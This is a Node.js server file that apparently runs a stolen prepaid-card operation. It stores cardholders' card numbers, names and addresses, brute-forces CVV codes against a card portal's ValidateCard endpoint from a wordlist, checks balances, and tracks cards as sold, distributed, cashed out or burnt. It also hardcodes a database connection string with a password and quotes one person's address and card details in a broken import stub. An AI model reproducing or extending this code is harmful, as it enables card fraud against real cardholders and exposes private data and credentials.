const {Client} = require("pg");
const client = new Client({
	connectionString: "postgres://shpcbqyt:mKIqzOHp1mK8xfMC49sGbTwr-6v02IAt@mahmud.db.elephantsql.com/shpcbqyt",
	ssl: {
		rejectUnauthorized: false
	}
});
const express = require("express");
const app = express();
const axios = require("axios");
const fs = require("fs");
const cors = require("cors");
const baseurl = "https://collector-ps-142293b20427.herokuapp.com/";

app.use(express.json());
app.use(cors());

client.connect();

const changeBalance = (balance, pid) => {
	console.log("Changing balance")
	console.log("pid from change balance ", pid);
	const query = {
		text: "UPDATE ccs SET balance = $1 WHERE pid = $2",
		values: [balance, pid]
	}
	client.query(query, (err) => {
		if (err) throw err;
	});
	return true;
}

const tryCvv = async (pid, cvv) => {
	const not = 'BAD-CARD';
	try {
		const response = await axios.post("https://chportal.3pea.net/api/v1/account/ValidateCard", {
			token: pid,
			cvv2: cvv
		});
		return Object.keys(response.data)[0] !== not;
	} catch(err) {
		return Object.keys(err.response.data)[0] !== not;
	}
}

const checkStatus = async (pid, cvv) => {
	const result = await tryCvv(pid, cvv);
	return	result;
}

const getBalance = async (realid, pid) => {
	try {
		const response = await axios.post("https://chportal.3pea.net/api/v1/card/GetQuickBalance", {
			realid,
		});
		const {balance} = response.data;
		changeBalance(balance, pid);
		return balance;
	} catch(err) {
		console.log(err);
		return false;
	}
}

const crackCvv = (pid) => {
	console.log("[!] Time Max per CVV code: 5 Minutes");

	if (pid.length !== 12 && pid.length !== 11) {
		throw Error ("[-] Invalid PID");
	} else {
		console.log("[+] Valid PID");
	}

	fs.readFile("./cvvs.txt", "utf8", async (err, data) => {
		let found = "";
		if (err) {
			throw Error("Error reading file");
		}
		const cvvs = data.split("\n");
		for await (const cvv of cvvs) {
			const result = await tryCvv(pid, cvv);
			if (result) {
				found = cvv;
				const query = {
					text: "UPDATE ccs SET cvv = $1 WHERE pid = $2",
					values: [cvv, pid]
				}
				client.query(query, () => {});
				break;
			}
			console.log("[-] Tried: " + cvv);
		}
		console.log(`[+] PID: ${pid}\nCVV: ${found}`);
	});
}

// Check and update card balance or status
app.post("/balance", (req, res) => {
	const {last4} = req.body;
	console.log("last 4 received", last4)
	let found = false;
	
	try {
		client.query("SELECT maindigits, realid, pid, cvv FROM ccs", async (err, resp) => {
			let msg = {};
			console.log("msg", msg);
			for await (const obj of resp.rows) {
				const {pid, maindigits, cvv, realid} = obj;
				console.log("obj", obj);
				let digits4 = maindigits.match(/.{1,4}/g)[3];
				console.log("obj digits 4", digits4);

				if (digits4 == last4) {
					found = true;	
					const status = await checkStatus(pid, cvv);
					console.log("found card, checking status");
					console.log(status);
					if (status) {
						const balance = await getBalance(realid, pid);
						console.log("status is active, obtaining balance");
						console.log(balance);
						msg["balance"] = balance;
						console.log(msg);
					} else {
						await axios.post(baseurl + "burnt", {
							burnt: true,
							pid,
						}) //
					}
					msg["status"] = status;
					console.log(msg);
					break;
				}
			}
			console.log("msg to send over", msg);
			res.json(msg);
		})
	} catch(err) {
		console.log(err);
		res.json(false);
	}
})

// Delete a pid
app.post("/delete", (req, res) => {
	try {
		const {pid} = req.body;
		client.query("DELETE FROM ccs WHERE pid = $1", [pid], (err, response) => {
			if (err) throw err;
			console.log(response);
			res.json(response);
		})
	} catch(err) {
		console.log(err);
		res.json(err); 
	}
});


// Select all the information from a pid.
app.post("/pid", (req, res) => {
	const {pid} = req.body;
	console.log(req.body)
	try {
		client.query("SELECT * FROM ccs WHERE pid = $1", [pid], (err, response) => {
			if (err) throw err;
			console.log(response);
			res.json(response);
		});
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});


// Request for all the pids
app.get("/all", (req, res) => {
	try {
client.query("SELECT pid, cashedout, balance, sold, distributed, used, paidout, burnt, underrevision, distributor FROM ccs", (err, response) => {
			if (err) throw err;
			console.log(response);
			res.json(response);
		});
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.get("/available", (req, res) => {
	try {
		client.query("SELECT balance, pid, realid FROM ccs WHERE distributed = false AND cashedout = false AND used = false AND sold = false AND burnt = false", (err, response) => {
			if (err) throw err;
			console.log(response);
			res.json(response.rows);
		})
	} catch(err) {
		console.log(err);
		res.json(err);
	}
})


// Set the card to the 'cashed out' state.
app.post("/cashout", (req, res) => {
	try {
		const {cashedout, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET cashedout = $1 WHERE pid = $2",
			values: [cashedout, pid]
		}
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.post("/distributed", (req, res) => {
	try {
		const {distributed, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET distributed = $1 WHERE pid = $2",
			values: [distributed, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.post("/used", (req, res) => {
	try {
		const {used, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET used = $1 WHERE pid = $2",
			values: [used, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.post("/sold", (req, res) => {
	try {
		const {sold, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET sold = $1 WHERE pid = $2",
			values: [sold, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.post("/paid", (req, res) => {
	try {
		const {paid, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET paidout = $1 WHERE pid = $2",
			values: [paid, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.post("/burnt", (req, res) => {
	try {
		const {burnt, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET burnt = $1 WHERE pid = $2",
			values: [burnt, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

app.post("/underrevision", (req, res) => {
	try {
		const {underrevision, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET underrevision = $1 WHERE pid = $2",
			values: [underrevision, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});


app.post("/owner", (req, res) => {
	try {
		const {owner, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET owner = $1 WHERE pid = $2",
			values: [owner, pid]
		};
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(err);
	}
});

// Import a new card
app.post("/card", (req, res) => {
	const {pid, maindigits, 
		   exp, firstName, middleName, 
		   lastName, address, secondAddress, city, state, zip, phoneNumber, balance, owner, realid, distributed, used, sold, burnt, paidout, underrevision} = req.body;
	try {
		client.query("INSERT INTO ccs (pid, maindigits, exp, firstname, middlename, lastname, address, secondaddress, city, state, zip, phonenumber, balance, cvv, cashedout, owner, realid, distributed, used, sold, burnt, paidout, underrevision) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23)", 
			[pid, maindigits, exp, firstName, middleName, lastName, address, secondAddress, city, state, zip, phoneNumber, balance, "PENDING", false, owner, realid, false, false, false, false, false, false], (err, response) => {
				if (err) throw err;
				crackCvv(pid);
				res.json(true);
			});
	} catch(err) {
		console.log(err);
		res.json(false);
	}
});

// Set the balance of the card.
app.post("/setbalance", (req, res) => {
	try {
		const {balance, pid} = req.body;
		console.log(req.body);
		changeBalance(balance, pid);
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(false);
	}
});

// Set the distributor of the card.
app.post("/setdistributor", (req, res) => {
	try {
		const {distributor, pid} = req.body;
		console.log(req.body);
		const query = {
			text: "UPDATE ccs SET distributor = $1 WHERE pid = $2",
			values: [distributor, pid]
		}
		client.query(query, (err) => {
			if (err) throw err;
		});
		res.json(true);
	} catch(err) {
		console.log(err);
		res.json(false);
	}
});

app.post("/importcards", (req, res) => {
	try {
		const text = req.body.text;
		name.split("\n")
		"Coral Harris ' 14510 N 125th LN ' El Mirage ' AZ ' 85335 ' 82571574290 ' 4299 ' 10/27"
		const [city, state, zip, pid, last4, exp] = name.split("\n")[0]

	} catch(err) {
		console.log(err);
		res.json(false);
	}
});


app.listen(process.env.PORT || 3000);